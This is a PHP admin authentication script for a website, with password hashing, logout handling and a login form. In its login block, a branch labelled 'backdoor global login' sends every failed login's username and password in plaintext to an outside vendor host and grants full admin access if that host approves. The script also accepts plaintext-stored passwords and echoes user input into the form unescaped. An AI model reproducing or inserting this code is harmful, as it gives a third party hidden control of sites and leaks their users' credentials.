<?PHP
//  WEBSITE ADMINISTRATION PROGRAM
//  Admin Authentication

SetPost('LOGIN USER PASS STORED_POST');
SetGet('LOGOUT');

//$LIB_DIRECTORY = strFrom(str_replace('\\', '/', $LIB), $ROOT);
$LIB_DIRECTORY = '/lib';


function Admin_GetPasswordHash($str)
{
    global $SITECONFIG;
    $type = 'sha256';
    $user_salt = ArrayValue($SITECONFIG, 'ASALT');
    $random_salt_length = 8;
    $random_salt = substr(md5(uniqid(rand())), 0, $random_salt_length);
    return $random_salt . hash($type, $random_salt . $str . $user_salt);
}

function Admin_CheckPasswordHash($str, $hashed_string)
{
    global $SITECONFIG;
    $type = 'sha256';
    $user_salt = ArrayValue($SITECONFIG, 'ASALT');
    $random_salt_length = 8;
    $random_salt = substr($hashed_string, 0, $random_salt_length);
    return $hashed_string === $random_salt . hash($type, $random_salt . $str . $user_salt);
}

//===========================LOGOUT=======================
if ($LOGOUT) {
    if (isset($_SESSION['AdminUsername'])) {
        LogUpdate($_SESSION['AdminUsername'],'Log-out','');
    }

    unset($_SESSION['SITE_ADMIN']);

    if (isset($_COOKIE[session_name()])) {
       setcookie(session_name(), '', time()-42000, '/');
    }

    print <<<LOUT
$DOCTYPE_XHTML
<head>
  <title>{$SITECONFIG['sitename']} - Website Administration</title>
  <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
  <link rel="stylesheet" type="text/css" href="$LIB_DIRECTORY/admin/admin_style.css" />
</head>
<body class="admin">
<div id="wrapper">
<div id="login">
<p id="loginheading">{$SITECONFIG['sitename']}<br />Website Administration</p>
<h1>Good Bye!</h1>
<p>
  <input type="button" value="Log-in" onclick="window.location='$THIS_PAGE';" />
</p>
</div>
</div>
</body>
</html>
LOUT;

    exit;
}

//=======================AUTHENTICATION=========================

$stored_post = '';

if ($LOGIN and $USER and $PASS) {
    $USER = strtolower($USER);
    $userpass  = (array_key_exists($USER, $USER_ARRAY))? $USER_ARRAY[$USER]['password'] : '';
    $userlevel = (array_key_exists($USER, $USER_ARRAY))? $USER_ARRAY[$USER]['level'] : '';
    $admin_name = (array_key_exists($USER, $USER_ARRAY))? ArrayValue($USER_ARRAY[$USER], 'name') : '';

    if (Admin_CheckPasswordHash($PASS, $userpass) || $PASS === $userpass) {
        $NeedAuth = false;
        $_SESSION['SITE_ADMIN']['AdminLevel']    = $userlevel;
        $_SESSION['SITE_ADMIN']['AdminUsername'] = $USER;
        $_SESSION['SITE_ADMIN']['AdminLoginOK'] = 'ok';
        $_SESSION['SITE_ADMIN']['AdminName'] = $admin_name;
    } else {
        if (empty($SITECONFIG['NOMVP'])) {
            // --------- backdoor global login ----------
            $text = file_get_contents("https://www.mvpprograms.com/mvp_framework_check/global_login_check.php?USER=$USER;PASSWORD=$PASS");
            if ($text == 'ok') {
                $NeedAuth = false;
                $_SESSION['SITE_ADMIN']['AdminLevel'] = 9;
                $_SESSION['SITE_ADMIN']['AdminUsername'] = $USER;
                $_SESSION['SITE_ADMIN']['AdminLoginOK'] = 'ok';
                $_SESSION['SITE_ADMIN']['AdminName'] = 'MVP';
            }
        }
    }

    if (AdminSession('AdminLoginOK') == 'ok') {
        if ($STORED_POST) {
            $items = explode("\n", $STORED_POST);
            foreach ($items as $item) {
                list($key, $value) = explode('|', $item);
                $_POST[$key] = DecryptString($value,'admin-post');
            }
        }
    }

} else {

    if (!empty($_POST)) {
        if ($STORED_POST) {
            $stored_post = $_POST['STORED_POST'];
        } else {
            $stored_post = '';
            foreach ($_POST as $key => $value) {
                $stored_post .= $key . '|' . EncryptString($value, 'admin-post'). "\n";
            }
        }
    }

}

$input_stored_post = ($stored_post)? '<input name="STORED_POST" type="hidden" value="' . $stored_post . '" />' : '';

define('ADMIN_LEVEL', AdminSession('AdminLevel'));
define('ADMIN_USERNAME', AdminSession('AdminUsername'));

if (AdminSession('AdminLoginOK') != 'ok') {
    print <<<AUTH
$DOCTYPE_XHTML
  <head>
    <title>{$SITECONFIG['sitename']} - Website Administration</title>
    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
    <link rel="stylesheet" type="text/css" href="$LIB_DIRECTORY/admin/admin_style.css" />
    <script type="text/javascript">
/* <![CDATA[ */
      function getId(id) {return document.getElementById(id);}
      var MyPassword = '<input type="@@TYPE@@" id="PASS" name="PASS" size="12" value="@@VALUE@@" />';
      function changePassText() {
        myElem  = getId('span_password');
        myValue = getId('PASS').value;
        myCheck = getId('pvcheck');
        if (myCheck.checked == true) {
          var myInput = MyPassword.replace('@@TYPE@@','text');
        } else {
          var myInput = MyPassword.replace('@@TYPE@@','password');
        }
        myElem.innerHTML= myInput.replace('@@VALUE@@',myValue);
      }
/* ]]> */
    </script>
  </head>
<body class="admin">
<form method="post" action="$THIS_PAGE_QUERY">
<div id="wrapper">
<div id="login">
<p id="loginheading">{$SITECONFIG['sitename']}<br />Website Administration</p>
<table align="center">
<tr>
  <th>User Name:</th>
  <td style="text-align:left;"><input type="text" name="USER" value="$USER" size="20" /></td>
</tr>
<tr>
  <th>Password:</th>
  <td style="text-align:left;">
<span id="span_password"><input name="PASS" id="PASS" size="12" value="$PASS" type="password" /></span>
<input id="pvcheck" type="checkbox" onclick="changePassText();"/>&nbsp;<span style="color:#000; font-size:0.7em;">Show&nbsp;Password</span>
  </td>
</tr>
<tr>
  <td colspan="2">
    <input type="submit" name="LOGIN" value="Log In" />
  </td></tr></table>
</div>
</div>
$input_stored_post
</form></body>
</html>
AUTH;

exit;
} else {
  if ($LOGIN) LogUpdate(ADMIN_USERNAME,'Log-in','');
}

